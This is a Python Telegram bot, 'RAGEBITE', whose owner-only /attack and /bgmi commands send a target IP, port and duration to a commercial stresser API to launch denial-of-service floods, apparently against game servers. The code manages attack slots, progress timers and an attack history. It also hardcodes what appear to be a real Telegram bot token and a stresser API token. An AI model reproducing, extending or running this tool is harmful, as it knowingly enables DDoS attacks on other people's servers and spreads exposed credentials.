#!/usr/bin/env python3
"""
⚔️ RAGEBITE MAIN BOT (@maIN_SWARGBOT)
"""

import telebot
from telebot import apihelper
import datetime
import time
import threading
import json
import os
import re
import requests
from http.server import BaseHTTPRequestHandler, HTTPServer

apihelper.CONNECT_TIMEOUT = 10
apihelper.READ_TIMEOUT = 10

BOT_TOKEN = "8876326049:AAGzqnWrWn5cVntgGMEtgdAM9pAxl1bdRI8"
OWNER_ID = "6321758394"

_API_SECRETS = {
    "endpoint":    "https://stresser.works/api/start",
    "token":       "ed0d3a83ab3dc439bb7e8fc7a7861ca96b47dcb2b753fba5d3bfdd373898351f",
    "method":      "BGMI",
    "concs":       "1",
    "geolocation": "ALL",
}

APP_IDS = ["com.ragebite.app"]
SLOTS_PER_APP = 4

STATE_FILE = "wispbyte_state.json"
PORT = int(os.environ.get("PORT", "8080"))

state = {"app_slots": {}, "attack_history": []}


def _init_app_slots():
    if "app_slots" not in state:
        state["app_slots"] = {}
    for app_id in APP_IDS:
        if app_id not in state["app_slots"]:
            state["app_slots"][app_id] = [None] * SLOTS_PER_APP


def load_state():
    global state
    try:
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
    except:
        state = {"app_slots": {}, "attack_history": []}
    state.setdefault("app_slots", {})
    state.setdefault("attack_history", [])
    _init_app_slots()
    save_state()


def save_state():
    try:
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)
    except:
        pass


def now():
    return time.time()


def is_owner(uid):
    return str(uid) == OWNER_ID


def get_app_slots(app_id):
    if app_id not in state["app_slots"]:
        state["app_slots"][app_id] = [None] * SLOTS_PER_APP
    return state["app_slots"][app_id]


def get_available_slot(app_id):
    slots = get_app_slots(app_id)
    for i, slot in enumerate(slots):
        if slot is None:
            return i
    return -1


def get_active_count_in_app(app_id):
    slots = get_app_slots(app_id)
    return sum(1 for s in slots if s is not None and s.get('status') == 'running')


def clean_stuck_attacks_in_app(app_id):
    current_time = now()
    slots = get_app_slots(app_id)
    cleaned = 0
    for i, slot in enumerate(slots):
        if slot is not None and slot.get('status') == 'running':
            if slot.get('expires', 0) < current_time:
                slots[i] = None
                cleaned += 1
    if cleaned > 0:
        save_state()
    return cleaned


attack_lock = threading.RLock()


def remove_attack_from_app_slot(app_id, user_id, slot_index=None):
    with attack_lock:
        slots = get_app_slots(app_id)
        for i, slot in enumerate(slots):
            if slot is not None and slot.get('user_id') == user_id and slot.get('status') == 'running':
                if slot_index is not None and i != slot_index:
                    continue
                slots[i] = None
                save_state()
                return True
    return False


def reserve_attack_slot_app(app_id, user_id, target, port, duration, username):
    with attack_lock:
        clean_stuck_attacks_in_app(app_id)
        slots = get_app_slots(app_id)

        slot_index = get_available_slot(app_id)
        if slot_index == -1:
            slot_index = 0
            slots[0] = None

        attack_data = {
            "user_id": user_id,
            "ip": target,
            "port": port,
            "duration": duration,
            "expires": now() + duration + 5,
            "username": username,
            "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "status": "running",
            "slot": slot_index,
            "app_id": app_id
        }
        slots[slot_index] = attack_data
        save_state()
        return attack_data, "OK"


bot = telebot.TeleBot(BOT_TOKEN)


def start_attack(ip, port, duration):
    try:
        print(f"📤 Attack: {ip}:{port} for {duration}s")
        params = {
            "token":       _API_SECRETS["token"],
            "host":        ip,
            "port":        port,
            "time":        duration,
            "method":      _API_SECRETS["method"],
            "concs":       _API_SECRETS["concs"],
            "geolocation": _API_SECRETS["geolocation"],
        }
        response = requests.get(_API_SECRETS["endpoint"], params=params, timeout=10)
        print(f"📥 Response: {response.status_code}")
        if 200 <= response.status_code < 300:
            return {"success": True}
        return {"success": False, "error": f"HTTP {response.status_code}"}
    except Exception as e:
        print(f"⚠️ Error: {type(e).__name__}")
        return {"success": False, "error": "Network error"}


def update_timer(chat_id, msg_id, app_id, target, port, duration, user_id, slot_index):
    try:
        elapsed = 0
        last_update = 0
        while elapsed < duration:
            time.sleep(2)
            elapsed += 2
            if elapsed - last_update < 5 and elapsed < duration:
                continue
            last_update = elapsed
            remaining = duration - elapsed
            if remaining <= 0:
                break
            finish_time = (datetime.datetime.now() + datetime.timedelta(seconds=remaining)).strftime('%H:%M:%S')
            bar_length = 20
            filled = int((elapsed / duration) * bar_length)
            bar = "█" * filled + "░" * (bar_length - filled)
            clean_stuck_attacks_in_app(app_id)

            timer_text = f"""⚡ ATTACK IN PROGRESS!

📱 App: {app_id}
🎯 Target: {target}:{port}
⏱ Elapsed: {elapsed}s / {duration}s
⏳ Remaining: {remaining}s
📊 Progress: [{bar}] {int((elapsed/duration)*100)}%

⌛ Finishes: {finish_time}
📌 Slot: {slot_index + 1}/{SLOTS_PER_APP}

🔥 RAGEBITE"""
            try:
                bot.edit_message_text(timer_text, chat_id, msg_id)
            except:
                break
    except Exception as e:
        print(f"Timer error: {e}")
    finally:
        try:
            remove_attack_from_app_slot(app_id, user_id, slot_index)
        except:
            pass


class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Ragebite Bot!")

    def log_message(self, format, *args):
        pass


def start_health_server():
    try:
        server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
        server.serve_forever()
    except:
        pass


def do_attack_app(message, app_id, target, port, duration, user_id, chat_id, extra_note=""):
    clean_stuck_attacks_in_app(app_id)

    attack_data, _ = reserve_attack_slot_app(
        app_id, user_id, target, port, duration, "owner"
    )

    msg = bot.reply_to(message, "⚡ Initiating attack...")
    msg_id = msg.message_id

    result = start_attack(target, port, duration)

    if not result.get("success"):
        remove_attack_from_app_slot(app_id, user_id)
        bot.edit_message_text("❌ Attack Failed!", chat_id, msg_id)
        return

    slot_index = attack_data.get('slot', 0)

    state["attack_history"].append({
        "app_id": app_id,
        "ip": target, "port": port, "duration": duration,
        "start_time": datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "slot": slot_index
    })
    if len(state["attack_history"]) > 200:
        state["attack_history"] = state["attack_history"][-200:]
    save_state()

    timer_text = f"""⚡ ATTACK LAUNCHED!

📱 App: {app_id}
🎯 Target: {target}:{port}
⏱ Duration: {duration}s
📌 Slot: {slot_index + 1}/{SLOTS_PER_APP}

🔥 RAGEBITE{extra_note}"""

    bot.edit_message_text(timer_text, chat_id, msg_id)

    threading.Thread(
        target=update_timer,
        args=(chat_id, msg_id, app_id, target, port, duration, user_id, slot_index),
        daemon=True
    ).start()


@bot.message_handler(commands=['bgmi'])
def cmd_bgmi(message):
    if not is_owner(message.from_user.id):
        return

    command = message.text.split()
    if len(command) < 4:
        bot.reply_to(message, "❌ `/bgmi <ip> <port> <time>`", parse_mode='Markdown')
        return

    target, port_str, time_str = command[1], command[2], command[3]
    app_id = command[4] if len(command) >= 5 else APP_IDS[0]

    if app_id not in APP_IDS:
        bot.reply_to(message, f"❌ Unknown app. Available: {', '.join(APP_IDS)}")
        return

    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        bot.reply_to(message, "❌ Invalid IP")
        return

    try:
        port = int(port_str)
        duration = int(time_str)
        if not 1 <= port <= 65535:
            bot.reply_to(message, "❌ Port 1-65535")
            return
        if duration < 10 or duration > 300:
            bot.reply_to(message, "❌ Time 10-300s")
            return
    except ValueError:
        bot.reply_to(message, "❌ Invalid numbers")
        return

    print(f"🎯 [APK] {target}:{port} for {duration}s")

    do_attack_app(
        message, app_id, target, port, duration,
        f"apk_{app_id}", message.chat.id,
        extra_note=f"\n\n📱 APK: `{app_id}`"
    )


@bot.message_handler(commands=['attack'])
def cmd_attack(message):
    if not is_owner(message.from_user.id):
        return

    command = message.text.split()
    if len(command) < 4:
        bot.reply_to(message, "❌ `/attack <ip> <port> <time>`", parse_mode='Markdown')
        return

    target, port_str, time_str = command[1], command[2], command[3]
    app_id = command[4] if len(command) >= 5 else APP_IDS[0]

    if app_id not in APP_IDS:
        bot.reply_to(message, f"❌ Unknown app. Available: {', '.join(APP_IDS)}")
        return

    if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
        bot.reply_to(message, "❌ Invalid IP")
        return

    try:
        port = int(port_str)
        duration = int(time_str)
        if not 1 <= port <= 65535:
            bot.reply_to(message, "❌ Port 1-65535")
            return
        if duration < 10 or duration > 300:
            bot.reply_to(message, "❌ Time 10-300s")
            return
    except ValueError:
        bot.reply_to(message, "❌ Invalid numbers")
        return

    print(f"🎯 [OWNER] {target}:{port} for {duration}s")

    do_attack_app(
        message, app_id, target, port, duration,
        "owner", message.chat.id,
        extra_note=f"\n\n👑 Owner"
    )


@bot.message_handler(commands=['start'])
def cmd_start(message):
    if not is_owner(message.from_user.id):
        return

    apps_status = ""
    for app_id in APP_IDS:
        active = get_active_count_in_app(app_id)
        apps_status += f"• `{app_id}`: {active}/{SLOTS_PER_APP}\n"

    bot.reply_to(message, f"""👑 **RAGEBITE BOT**

📱 **Apps:**
{apps_status}
💥 **Commands:**
`/attack <ip> <port> <time>`
`/bgmi <ip> <port> <time>`
`/slots`
`/status`
`/clearslots`

🔒 Owner-only""", parse_mode='Markdown')


@bot.message_handler(commands=['slots'])
def cmd_slots(message):
    if not is_owner(message.from_user.id):
        return

    response = "📊 **SLOTS**\n\n"
    for app_id in APP_IDS:
        active = get_active_count_in_app(app_id)
        response += f"📱 `{app_id}` — {active}/{SLOTS_PER_APP}\n"
        slots = get_app_slots(app_id)
        for i, s in enumerate(slots):
            if s is not None and s.get('status') == 'running':
                rem = int(s.get('expires', 0) - now())
                response += f"   🔴 Slot {i+1}: {s.get('ip')}:{s.get('port')} | {rem}s\n"
            else:
                response += f"   🟢 Slot {i+1}: FREE\n"
        response += "\n"
    bot.reply_to(message, response, parse_mode='Markdown')


@bot.message_handler(commands=['status'])
def cmd_status(message):
    if not is_owner(message.from_user.id):
        return

    total_active = sum(get_active_count_in_app(a) for a in APP_IDS)
    total_slots = len(APP_IDS) * SLOTS_PER_APP

    bot.reply_to(message, f"""📊 **STATUS**

📱 Apps: {len(APP_IDS)}
📊 Slots: {total_active}/{total_slots}
📜 History: {len(state.get('attack_history', []))}""", parse_mode='Markdown')


@bot.message_handler(commands=['clearslots'])
def cmd_clearslots(message):
    if not is_owner(message.from_user.id):
        return
    for app_id in APP_IDS:
        state["app_slots"][app_id] = [None] * SLOTS_PER_APP
    save_state()
    bot.reply_to(message, "✅ Slots cleared!")


def main():
    load_state()
    threading.Thread(target=start_health_server, daemon=True).start()

    print("=" * 60)
    print("👑 RAGEBITE BOT (@maIN_SWARGBOT)")
    print("=" * 60)
    print(f"👑 Owner: {OWNER_ID}")
    print(f"📱 App: {APP_IDS[0]}")
    print(f"📊 Slots: {SLOTS_PER_APP}")
    print("=" * 60)
    print("✅ Running...")
    print("=" * 60)

    while True:
        try:
            bot.polling(non_stop=True, interval=1, timeout=10, long_polling_timeout=10)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)


if __name__ == "__main__":
    main()
